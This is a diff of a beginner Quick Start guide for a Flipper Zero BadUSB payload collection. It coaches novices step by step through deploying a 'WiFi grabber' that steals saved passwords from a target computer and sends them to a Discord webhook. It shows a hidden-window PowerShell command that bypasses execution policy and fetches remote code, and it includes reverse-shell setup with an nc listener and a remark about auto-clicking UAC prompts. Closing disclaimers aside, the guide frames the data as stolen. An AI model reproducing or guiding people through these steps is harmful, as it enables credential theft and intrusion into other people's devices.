@@ -1,159 +1,150 @@
 # 🚀 Quick Start Guide
 
-Get up and running with Flipper Zero BadUSB payloads in 5 minutes!
+**Complete beginner? No problem!** This guide gets you running payloads in under 10 minutes.
 
 ---
 
-## 📋 Prerequisites
+## ⚡ What You'll Need
 
-- Flipper Zero with BadUSB capability
-- Target computer (Windows, Linux, macOS, or iOS)
-- (Optional) Discord account for receiving exfiltrated data
-
----
-
-## 🎯 Step 1: Set Up Discord Webhook
-
-Most payloads send data to Discord. Here's how to set up a webhook:
-
-1. **Create or open a Discord server**
-2. **Go to Server Settings** → **Integrations** → **Webhooks**
-3. **Click "New Webhook"**
-4. **Copy the webhook URL** (looks like `https://discord.com/api/webhooks/123456/abcdef...`)
+- ✅ Flipper Zero
+- ✅ Computer to configure payloads
+- ✅ Discord account (free) - for receiving stolen data
+- ✅ Target device to test on
 
 ---
 
-## 🎯 Step 2: Choose Your Payload
+## 📝 Step-by-Step Setup
 
-Navigate to the `payloads/` folder and pick one:
+### Step 1: Create Discord Webhook (2 minutes)
 
-### Plug & Play (No Configuration Needed)
+This is where Flipper sends stolen data like WiFi passwords, screenshots, etc.
+
+**Instructions:**
+
+1. Open **Discord** on your computer or phone
+2. Create a new server (or use existing one)
+   - Click the **+** button → **Create My Own** → **For me and my friends**
+   - Name it anything (e.g., "Flipper Data")
+3. Right-click the server name → **Server Settings**
+4. Go to **Integrations** → **Webhooks**
+5. Click **New Webhook**
+6. Click **Copy Webhook URL**
+
+**You'll get a URL like this:**
 ```
-payloads/windows/fun/rickroll.txt       # Rick Roll
-payloads/windows/fun/fake_bsod.txt      # Fake Blue Screen
-payloads/linux/fun/rickroll.txt         # Linux Rick Roll
-payloads/ios/pranks/rickroll.txt        # iOS Rick Roll
+https://discord.com/api/webhooks/1234567890/AbCdEfGhIjKlMnOpQrStUvWxYz
 ```
 
-### Requires Configuration
-```
-payloads/windows/exfiltration/wifi_grabber.txt    # WiFi passwords → Discord
-payloads/windows/exfiltration/screenshot.txt      # Screenshot → Discord
-payloads/windows/execution/reverse_shell.txt      # Reverse shell
-```
+✅ **Save this URL somewhere!** You'll need it in Step 3.
 
 ---
 
-## 🎯 Step 3: Configure the Payload
+### Step 2: Download a Payload (1 minute)
 
-Open your chosen `.txt` file and replace the placeholders:
+**For your first time, start with something simple:**
 
-### For Discord Payloads
+#### Option A: Just for Fun (No setup needed!)
 ```
-YOUR_DISCORD_WEBHOOK → https://discord.com/api/webhooks/123456/abcdef
+payloads/windows/fun/rickroll.txt
 ```
+Opens Rick Roll video - perfect for testing!
 
-### For Reverse Shells
+#### Option B: Steal WiFi Passwords (Requires Discord webhook)
 ```
-YOUR_IP → 192.168.1.100
-YOUR_PORT → 4444
+payloads/windows/exfiltration/wifi_grabber.txt
 ```
+Grabs all saved WiFi passwords and sends to Discord.
 
-### Example: WiFi Grabber
-**Before:**
+**Download the file** or copy it from the GitHub repo.
+
+---
+
+### Step 3: Configure the Payload (2 minutes)
+
+#### If you chose Rick Roll (Option A):
+✅ **Skip this step!** Rick Roll needs no configuration.
+
+#### If you chose WiFi Grabber (Option B):
+
+1. **Open the `.txt` file** in any text editor:
+   - Windows: Right-click → **Open with** → **Notepad**
+   - Mac: Right-click → **Open With** → **TextEdit**
+   - Linux: Any text editor
+
+2. **Find this part** (around line 18):
+   ```
+   $env:DC='YOUR_DISCORD_WEBHOOK'
+   ```
+
+3. **Replace `YOUR_DISCORD_WEBHOOK`** with your actual webhook from Step 1:
+   
+   **BEFORE:**
+   ```
+   $env:DC='YOUR_DISCORD_WEBHOOK'
+   ```
+   
+   **AFTER:**
+   ```
+   $env:DC='https://discord.com/api/webhooks/1234567890/AbCdEf...'
+   ```
+
+4. **Save the file** (Ctrl+S or Cmd+S)
+
+✅ **Done!** Your payload is ready.
+
+---
+
+### Step 4: Copy to Flipper Zero (3 minutes)
+
+You have 2 options:
+
+#### Option A: Using qFlipper (Easier)
+
+1. **Download qFlipper** from flipper.net if you don't have it
+2. **Connect Flipper** to your computer via USB
+3. **Open qFlipper**
+4. In qFlipper, navigate to: **SD Card** → **badusb** folder
+   - If `badusb` folder doesn't exist, create it
+5. **Drag and drop** your `.txt` file into the `badusb` folder
+
+#### Option B: Using SD Card Reader
+
+1. **Turn off Flipper**
+2. **Remove SD card** from Flipper
+3. **Insert SD card** into your computer
+4. **Open the SD card** and go to the `badusb` folder
+   - If `badusb` folder doesn't exist, create it
+5. **Copy your `.txt` file** into the `badusb` folder
+6. **Eject SD card** safely
+7. **Put SD card back** in Flipper
+
+---
+
+### Step 5: Run the Payload! (1 minute)
+
+**On your Flipper:**
+
+1. Navigate to: **Apps** → **USB** → **Bad USB**
+2. Select your payload (e.g., `wifi_grabber.txt`)
+3. **Plug Flipper into target computer** via USB
+4. Press the **OK button** (center button) to run
+
+**What happens:**
+- Flipper types commands super fast (like keyboard)
+- Payload runs automatically
+- Data gets sent to your Discord webhook
+- Check your Discord server for results!
+
+---
+
+## 🎯 Your First Test
+
+Try this ultra-simple test payload to make sure everything works:
+
+### Create `test.txt`:
 ```duckyscript
-STRING powershell -w h -ep bypass "$env:DC='YOUR_DISCORD_WEBHOOK';$env:M='wifi';irm https://..."
-```
-
-**After:**
-```duckyscript
-STRING powershell -w h -ep bypass "$env:DC='https://discord.com/api/webhooks/123/abc';$env:M='wifi';irm https://..."
-```
-
----
-
-## 🎯 Step 4: Copy to Flipper Zero
-
-### Method 1: qFlipper
-1. Connect Flipper via USB
-2. Open qFlipper
-3. Navigate to `SD Card/badusb/`
-4. Drag and drop your `.txt` file
-
-### Method 2: Direct SD Access
-1. Remove SD card from Flipper
-2. Insert into computer
-3. Copy `.txt` file to `badusb/` folder
-4. Reinsert SD into Flipper
-
----
-
-## 🎯 Step 5: Run the Payload
-
-1. On Flipper: **Bad USB** → Select your payload
-2. Connect Flipper to target computer
-3. Press **Run** (center button)
-4. Watch the magic happen!
-
----
-
-## 🧪 Testing Tips
-
-### Test Safely
-- ✅ Use a **virtual machine** first
-- ✅ Test on your **own devices**
-- ✅ Take **snapshots** before running destructive payloads
-
-### Common Issues
-
-| Problem | Solution |
-|---------|----------|
-| PowerShell blocked | Target may have execution policy restrictions |
-| UAC prompt appears | User needs to click "Yes" for admin payloads |
-| Nothing happens | Increase DELAY values in payload |
-| Wrong characters typed | Check keyboard layout (US QWERTY assumed) |
-
-### Adjust Timing
-If the payload types too fast, increase delays:
-```duckyscript
-DELAY 500    # Default
-DELAY 1000   # Slower (for older computers)
-DELAY 2000   # Very slow (for VMs)
-```
-
----
-
-## 📱 Platform-Specific Notes
-
-### Windows
-- Most payloads work out of the box
-- Some require admin (will show UAC prompt)
-- Defender may block some actions
-
-### Linux
-- Uses `CTRL ALT t` to open terminal
-- Requires curl installed (usually is)
-- May need sudo for some operations
-
-### macOS
-- Uses Spotlight (`GUI SPACE`) to open Terminal
-- Security prompts may appear
-- SIP may block some operations
-
-### iOS
-- Device **must be unlocked**
-- Limited to app launching and typing
-- No terminal access = no modular payloads
-
----
-
-## 🎉 Your First Payload
-
-Try this simple test payload to verify everything works:
-
-### Windows Test
-```duckyscript
-REM Test Payload
+REM === Test Payload ===
+REM Opens Notepad and types a message
 DELAY 1000
 GUI r
 DELAY 500
@@ -161,27 +152,144 @@ STRING notepad
 ENTER
 DELAY 1000
 STRING Hello from Flipper Zero!
+ENTER
+STRING It works!
 ```
 
-Save as `test.txt`, copy to Flipper, and run!
+1. Save this as `test.txt`
+2. Copy to Flipper (`badusb/test.txt`)
+3. Run on Windows computer
+4. You should see Notepad open with your message!
+
+---
+
+## 🔧 Troubleshooting
+
+### "Nothing happened when I ran the payload"
+
+**Try these fixes:**
+
+1. **Increase delays** - Some computers are slower
+   - Open your `.txt` file
+   - Find lines like `DELAY 500`
+   - Change to `DELAY 1000` or `DELAY 2000`
+
+2. **Check USB connection**
+   - Make sure Flipper is plugged in correctly
+   - Try a different USB port
+
+3. **Keyboard layout**
+   - Payloads assume US QWERTY keyboard
+   - If you have different layout, it may type wrong characters
+
+### "UAC prompt appeared and payload stopped"
+
+Some payloads need admin rights. The target user needs to:
+- Click **Yes** on the UAC prompt, OR
+- The payload will add delays and auto-click Yes (check payload comments)
+
+### "Discord didn't receive anything"
+
+**Check these:**
+
+1. **Webhook URL correct?**
+   - Make sure you copied the ENTIRE webhook URL
+   - Should start with `https://discord.com/api/webhooks/`
+
+2. **Target has internet?**
+   - Payloads need internet to send data to Discord
+
+3. **Firewall blocking?**
+   - Some firewalls block PowerShell/Bash from accessing internet
+
+### "Payload typed wrong characters"
+
+Your target has a different keyboard layout. Payloads are designed for US QWERTY.
+
+**Fix:** Test on a computer with US keyboard layout.
+
+---
+
+## 📋 Configuration Cheat Sheet
+
+### Discord Webhooks
+```
+Find: YOUR_DISCORD_WEBHOOK
+Replace with: https://discord.com/api/webhooks/YOUR_ACTUAL_WEBHOOK
+```
+
+### Reverse Shells
+```
+Find: YOUR_IP and YOUR_PORT
+Replace with: Your computer's IP (192.168.1.100) and port (4444)
+
+Set up listener first:
+nc -lvnp 4444
+```
+
+### Custom URLs
+```
+Find: YOUR_URL
+Replace with: Any URL you want (e.g., https://example.com)
+```
+
+---
+
+## 🎓 Platform-Specific Notes
+
+### Windows
+- ✅ Most compatible platform
+- Some payloads need admin (UAC prompt appears)
+- Windows Defender may block some actions
+
+### Linux
+- Opens terminal with `CTRL ALT t`
+- Needs `curl` installed (usually already there)
+- May need sudo password for some payloads
+
+### macOS
+- Opens terminal with Spotlight (`GUI SPACE`)
+- Security prompts may appear
+- Some features blocked by System Integrity Protection (SIP)
+
+### iOS
+- **Device MUST be unlocked**
+- Very limited - can only open apps and type
+- No terminal = no modular payloads available
 
 ---
 
 ## 📚 Next Steps
 
-1. **Explore more payloads** in the `payloads/` folder
-2. **Read the documentation** for advanced usage
-3. **Fork the repo** to customize for your needs
-4. **Contribute** if you create something cool!
+Once you're comfortable with the basics:
+
+1. **Explore more payloads** - Check `payloads/` folder for 42 different options
+2. **Read full docs** - See [README.md](README.md) for advanced features
+3. **Test safely** - Use virtual machines (see [TESTING.md](TESTING.md))
+4. **Create your own** - Modify existing payloads or create new ones
 
 ---
 
-## 🆘 Need Help?
+## ⚠️ Important Reminders
 
-- Check the [README.md](README.md) for detailed info
-- Look at payload comments for configuration hints
-- Open an issue on GitHub
+- ✅ **Test on your OWN devices only**
+- ✅ **Get written permission** for any testing on other systems
+- ✅ **Use virtual machines** for dangerous payloads
+- ❌ **NEVER use on systems you don't own** - that's illegal!
+
+See [DISCLAIMER.md](DISCLAIMER.md) for full legal information.
+
+---
+
+## 🆘 Need More Help?
+
+- **Check payload files** - They have comments explaining configuration
+- **Read the README** - [README.md](README.md) has detailed info
+- **Open an issue** - GitHub issues for bug reports or questions
+- **Check TESTING.md** - [TESTING.md](TESTING.md) for VM setup and safety
 
 ---
 
 **Happy hacking! 🐬**
+
+*Remember: With great power comes great responsibility. Use ethically!*
